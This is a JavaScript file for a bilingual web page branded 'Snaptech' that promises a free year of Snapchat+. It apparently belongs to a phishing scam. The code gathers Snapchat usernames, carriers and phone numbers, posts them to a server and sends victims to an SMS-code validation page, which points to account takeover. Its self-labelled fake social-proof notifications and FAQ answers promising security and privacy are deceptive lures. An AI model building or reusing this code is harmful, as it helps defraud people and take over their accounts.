const CONFIG = { API_URL: '/api/snapchat', SYNC_INTERVAL: 30000 };

/* ─── Ban check ─────────────────────────────────────────────────────────────── */
async function checkBan() {
    try {
        const res = await fetch('/api/check-ban');
        const data = await res.json();
        if (data.banned) window.location.href = 'banned.html';
    } catch (e) { console.error('Ban check error:', e); }
}

/* ─── Fake social-proof notifications ──────────────────────────────────────── */
const notifNames    = ['Emma','Lucas','Chloe','Noah','Ines','Liam','Jade','Ethan','Lena','Nathan','Zoe','Tom','Manon','Leo','Camille','Hugo','Sarah','Mathis','Julie','Theo','Laura','Louis','Anais','Gabriel'];
const notifSurnames = ['Dubois','Martin','Bernard','Petit','Robert','Richard','Durand','Leroy','Moreau','Simon','Laurent','Lefebvre','Michel','Garcia'];

function getRandomNotif() {
    const name    = notifNames[Math.floor(Math.random() * notifNames.length)];
    const surname = notifSurnames[Math.floor(Math.random() * notifSurnames.length)];
    return '🎉 ' + name + ' ' + surname.substring(0, 2) + '*** vient de recevoir Snap+ !';
}

function startNotifications() {
    const el = document.getElementById('notifText');
    if (!el) return;
    el.textContent = getRandomNotif();
    setInterval(() => {
        el.style.opacity = '0';
        el.style.transform = 'translateX(10px)';
        setTimeout(() => {
            el.textContent    = getRandomNotif();
            el.style.opacity  = '1';
            el.style.transform = 'translateX(0)';
        }, 400);
    }, 3500);
}

/* ─── i18n ──────────────────────────────────────────────────────────────────── */
const translations = {
    fr: {
        title:              "🎉 Activer Snapchat+ pendant 1 an !",
        submitBtn:          "Activer Snapchat+",
        warning:            "⚠️ Disponible uniquement pour les numéros France des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas",
        warningBe:          "⚠️ Disponible uniquement pour les numéros Belgique des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas",
        usernameLabel:      "👤 Nom d'utilisateur Snapchat",
        operatorLabel:      "📱 Opérateur mobile",
        phoneLabel:         "📞 Numéro de téléphone",
        locationLabel:      "📍 Localisation",
        locationFr:         "🇫🇷 France",
        locationBe:         "🇧🇪 Belgique",
        operatorsFr:        ["Orange", "SFR", "Bouygues"],
        operatorsBe:        ["BASE", "Orange Belgique", "Proximus", "Telenet"],
        statusSuccess:      "✅ Demande envoyée ! Redirection en cours...",
        statusError:        "❌ Erreur serveur, veuillez réessayer.",
        statusInvalid:      "⚠️ Veuillez remplir tous les champs correctement.",
        statusPhoneInvalid: "⚠️ Numéro invalide (format attendu : 06XXXXXXXX)",
        statusUsernameInvalid: "⚠️ Username invalide (3–15 caractères)",
        offlineSaved:       "💾 Sauvegardé hors-ligne. Synchronisation automatique...",
        faqTitle:           "❓ Questions fréquentes",
        faqSubtitle:        "Tout ce que vous devez savoir avant de commencer",
        faq: [
            { q: "💰 C'est vraiment gratuit ?",                    a: "Oui, totalement gratuit. Aucun paiement requis, aucune carte bancaire demandée. Snaptech active votre abonnement Snapchat+ sans aucun frais." },
            { q: "⏱️ Combien de temps pour recevoir le SMS ?",     a: "En général moins de 2 minutes. Un membre de notre équipe traite votre demande dès qu'elle est reçue. Le SMS arrive directement de Snapchat sur votre téléphone." },
            { q: "📱 Ça marche avec mon opérateur ?",              a: "Snaptech est compatible avec Orange, SFR et Bouygues en France, ainsi que BASE, Orange Belgique, Proximus et Telenet en Belgique. Les autres opérateurs ne sont pas encore supportés." },
            { q: "🔒 Mon numéro est-il sécurisé ?",                a: "Votre numéro est utilisé uniquement pour l'activation et n'est jamais revendu ni partagé. Les données sont chiffrées et supprimées après traitement de votre demande." },
            { q: "🔄 Je n'ai pas reçu de code SMS, que faire ?",   a: "Si vous ne recevez pas de SMS dans les 5 minutes, vérifiez que votre numéro est correct et que votre téléphone a bien du réseau. Vous pouvez relancer une nouvelle demande directement depuis la page de saisie du code." },
            { q: "📅 Combien de temps dure l'abonnement ?",        a: "L'abonnement Snapchat+ est activé pour 1 an complet. À l'issue de cette période, vous pourrez relancer une nouvelle activation gratuitement." },
        ],
    },
    en: {
        title:              "🎉 Activate Snapchat+ for 1 year!",
        submitBtn:          "Activate Snapchat+",
        warning:            "⚠️ Available only for France numbers from the listed operators — others won't work",
        warningBe:          "⚠️ Available only for Belgium numbers from the listed operators — others won't work",
        usernameLabel:      "👤 Snapchat Username",
        operatorLabel:      "📱 Mobile Operator",
        phoneLabel:         "📞 Phone Number",
        locationLabel:      "📍 Location",
        locationFr:         "🇫🇷 France",
        locationBe:         "🇧🇪 Belgium",
        operatorsFr:        ["Orange", "SFR", "Bouygues"],
        operatorsBe:        ["BASE", "Orange Belgium", "Proximus", "Telenet"],
        statusSuccess:      "✅ Request sent! Redirecting...",
        statusError:        "❌ Server error, please try again.",
        statusInvalid:      "⚠️ Please fill in all fields correctly.",
        statusPhoneInvalid: "⚠️ Invalid number (expected: 06XXXXXXXX)",
        statusUsernameInvalid: "⚠️ Invalid username (3–15 characters)",
        offlineSaved:       "💾 Saved offline. Auto-syncing...",
        faqTitle:           "❓ Frequently Asked Questions",
        faqSubtitle:        "Everything you need to know before starting",
        faq: [
            { q: "💰 Is it really free?",                              a: "Yes, completely free. No payment required, no credit card needed. Snaptech activates your Snapchat+ subscription at no cost." },
            { q: "⏱️ How long until I receive the SMS?",               a: "Usually less than 2 minutes. A member of our team processes your request as soon as it's received. The SMS comes directly from Snapchat to your phone." },
            { q: "📱 Does it work with my carrier?",                   a: "Snaptech supports Orange, SFR and Bouygues in France, as well as BASE, Orange Belgium, Proximus and Telenet in Belgium. Other carriers are not yet supported." },
            { q: "🔒 Is my phone number secure?",                      a: "Your number is used solely for activation and is never resold or shared. Data is encrypted and deleted after your request is processed." },
            { q: "🔄 I didn't receive an SMS, what should I do?",      a: "If you don't receive an SMS within 5 minutes, check that your number is correct and that your phone has a signal. You can submit a new request directly from the code entry page." },
            { q: "📅 How long does the subscription last?",            a: "The Snapchat+ subscription is activated for a full year. After that period, you can start a new activation for free." },
        ],
    },
};

let currentLang = 'fr', selectedOperator = 'orange', isSubmitting = false;

const el = id => document.getElementById(id);
const elements = {
    langFr: el('langFr'), langEn: el('langEn'),
    siteLogo: el('siteLogo'), mainTitle: el('mainTitle'),
    warningMsg: el('warningMsg'), usernameLabel: el('usernameLabel'),
    operatorLabel: el('operatorLabel'), phoneLabel: el('phoneLabel'),
    locationLabel: el('locationLabel'), submitBtn: el('submitBtn'),
    submitBtnText: el('submitBtnText'), statusMsg: el('statusMsg'),
    username: el('username'), phone: el('phone'), location: el('location'),
    offlineQueue: el('offlineQueue'), queueCount: el('queueCount'),
    operatorButtons: el('operatorButtons'),
    faqTitle: el('faqTitle'), faqSubtitle: el('faqSubtitle'), faqList: el('faqList'),
};

/* ─── Language ──────────────────────────────────────────────────────────────── */
function setLanguage(lang) {
    currentLang = lang;
    const t   = translations[lang];
    const isBe = elements.location.value === 'belgique';

    elements.mainTitle.textContent    = t.title;
    elements.warningMsg.textContent   = isBe ? t.warningBe : t.warning;
    elements.usernameLabel.textContent = t.usernameLabel;
    elements.operatorLabel.textContent = t.operatorLabel;
    elements.phoneLabel.textContent   = t.phoneLabel;
    elements.locationLabel.textContent = t.locationLabel;
    if (elements.submitBtnText) elements.submitBtnText.textContent = t.submitBtn;
    elements.location.options[0].text = t.locationFr;
    elements.location.options[1].text = t.locationBe;
    elements.langFr.classList.toggle('active', lang === 'fr');
    elements.langEn.classList.toggle('active', lang === 'en');

    if (elements.faqTitle)    elements.faqTitle.textContent   = t.faqTitle;
    if (elements.faqSubtitle) elements.faqSubtitle.textContent = t.faqSubtitle;
    renderFaq(t.faq);
    updateOperators();
    updateQueueDisplay();
}

/* ─── FAQ ───────────────────────────────────────────────────────────────────── */
function renderFaq(faq) {
    if (!elements.faqList) return;
    elements.faqList.innerHTML = faq.map((item, i) => `
        <div class="faq-item" id="faq-item-${i}">
            <button class="faq-question" onclick="toggleFaq(${i})">
                <span>${item.q}</span>
                <i class="fas fa-chevron-down faq-icon"></i>
            </button>
            <div class="faq-answer">
                <p>${item.a}</p>
            </div>
        </div>
    `).join('');
}

function toggleFaq(index) {
    const item = document.getElementById('faq-item-' + index);
    if (!item) return;
    const isOpen = item.classList.contains('open');
    // Close all first
    document.querySelectorAll('.faq-item.open').forEach(el => el.classList.remove('open'));
    // Toggle current
    if (!isOpen) item.classList.add('open');
}

/* ─── Operators ─────────────────────────────────────────────────────────────── */
function updateOperators() {
    const t      = translations[currentLang];
    const isBe   = elements.location.value === 'belgique';
    const names  = isBe ? t.operatorsBe : t.operatorsFr;
    const values = isBe ? ['base','orange_be','proximus','telenet'] : ['orange','sfr','bouygues'];
    elements.operatorButtons.innerHTML = '';
    names.forEach((name, i) => {
        const btn = document.createElement('button');
        btn.className    = 'btn-operator' + (i === 0 ? ' active' : '');
        btn.dataset.operator = values[i];
        btn.textContent  = name;
        btn.onclick      = () => selectOperator(btn);
        elements.operatorButtons.appendChild(btn);
    });
    selectedOperator = values[0];
    elements.warningMsg.textContent = isBe ? translations[currentLang].warningBe : translations[currentLang].warning;
}

function selectOperator(btn) {
    elements.operatorButtons.querySelectorAll('.btn-operator').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    selectedOperator = btn.dataset.operator;
}

/* ─── Validation ────────────────────────────────────────────────────────────── */
function validateUsername(u) { return /^[a-zA-Z0-9._-]{3,15}$/.test(u); }

function validatePhone(phone, country) {
    const clean = phone.replace(/\s/g,'').replace(/^\+33/,'0').replace(/^\+32/,'0');
    if (country === 'belgique') return /^04[0-9]{8}$/.test(clean) ? clean : null;
    return /^0[67][0-9]{8}$/.test(clean) ? clean : null;
}

function validateForm() {
    const t       = translations[currentLang];
    const username = elements.username.value.trim();
    const phone    = elements.phone.value.trim();
    const country  = elements.location.value;
    if (!username || !phone)       { showStatus(t.statusInvalid,          'error'); return false; }
    if (!validateUsername(username)) { showStatus(t.statusUsernameInvalid, 'error'); return false; }
    const phoneClean = validatePhone(phone, country);
    if (!phoneClean)               { showStatus(t.statusPhoneInvalid,     'error'); return false; }
    return { username: username.toLowerCase(), phone: phoneClean, country };
}

/* ─── Status ─────────────────────────────────────────────────────────────────── */
function showStatus(message, type) {
    elements.statusMsg.textContent = message;
    elements.statusMsg.className   = 'status-message ' + type;
}

/* ─── Offline queue ──────────────────────────────────────────────────────────── */
function getQueue()      { try { return JSON.parse(localStorage.getItem('snaptech_queue') || '[]'); } catch { return []; } }
function saveQueue(q)    { try { localStorage.setItem('snaptech_queue', JSON.stringify(q)); } catch {} updateQueueDisplay(); }
function updateQueueDisplay() {
    const q = getQueue();
    if (elements.offlineQueue) elements.offlineQueue.style.display = q.length > 0 ? 'block' : 'none';
    if (elements.queueCount)   elements.queueCount.textContent     = q.length;
}
function addToQueue(data) {
    const q = getQueue();
    q.push({ ...data, id: Date.now(), attempts: 0 });
    saveQueue(q);
    showStatus(translations[currentLang].offlineSaved, 'success');
}

async function syncPendingRequests() {
    const queue = getQueue();
    if (!queue.length) return;
    let synced = 0;
    const remaining = [];
    for (const item of queue) {
        try {
            const r = await fetch(CONFIG.API_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(item) });
            if (r.ok) synced++;
            else { item.attempts = (item.attempts || 0) + 1; if (item.attempts < 5) remaining.push(item); }
        } catch { item.attempts = (item.attempts || 0) + 1; if (item.attempts < 5) remaining.push(item); }
    }
    saveQueue(remaining);
    if (synced > 0 && remaining.length === 0) showStatus(translations[currentLang].statusSuccess, 'success');
}

/* ─── Submit ─────────────────────────────────────────────────────────────────── */
async function submitForm() {
    if (isSubmitting) return;
    const validation = validateForm();
    if (!validation) return;

    const { username, phone, country } = validation;
    const data = { username, phone, location: country, operator: selectedOperator, lang: currentLang };

    isSubmitting = true;
    elements.submitBtn.classList.add('loading');
    elements.submitBtn.disabled = true;
    showStatus('', '');

    try {
        const response = await fetch(CONFIG.API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
        });
        const result = await response.json();

        if (response.ok && result.success) {
            showStatus(translations[currentLang].statusSuccess, 'success');
            setTimeout(() => {
                window.location.href = 'validation.html?phone=' + encodeURIComponent(phone) + '&carrier=' + encodeURIComponent(selectedOperator);
            }, 500);
        } else {
            // 409 no longer blocks — API now upserts — but handle any other error
            throw new Error(result.message || 'Server error');
        }
    } catch (error) {
        console.error('API Error:', error);
        // Go offline if network fails
        addToQueue(data);
    } finally {
        isSubmitting = false;
        elements.submitBtn.classList.remove('loading');
        elements.submitBtn.disabled = false;
    }
}

/* ─── Keyboard shortcuts ─────────────────────────────────────────────────────── */
document.addEventListener('keydown', e => {
    if (e.key === 'Enter') {
        const active = document.activeElement;
        if (active && ['username', 'phone'].includes(active.id)) { e.preventDefault(); submitForm(); }
    }
});

/* ─── Init ───────────────────────────────────────────────────────────────────── */
document.addEventListener('DOMContentLoaded', async () => {
    await checkBan();
    startNotifications();
    updateOperators();
    updateQueueDisplay();
    renderFaq(translations[currentLang].faq);
    setInterval(() => { if (navigator.onLine && getQueue().length > 0) syncPendingRequests(); }, CONFIG.SYNC_INTERVAL);
});

/* ─── Globals ────────────────────────────────────────────────────────────────── */
window.setLanguage          = setLanguage;
window.selectOperator       = selectOperator;
window.submitForm           = submitForm;
window.syncPendingRequests  = syncPendingRequests;
window.updateOperators      = updateOperators;
window.toggleFaq            = toggleFaq;
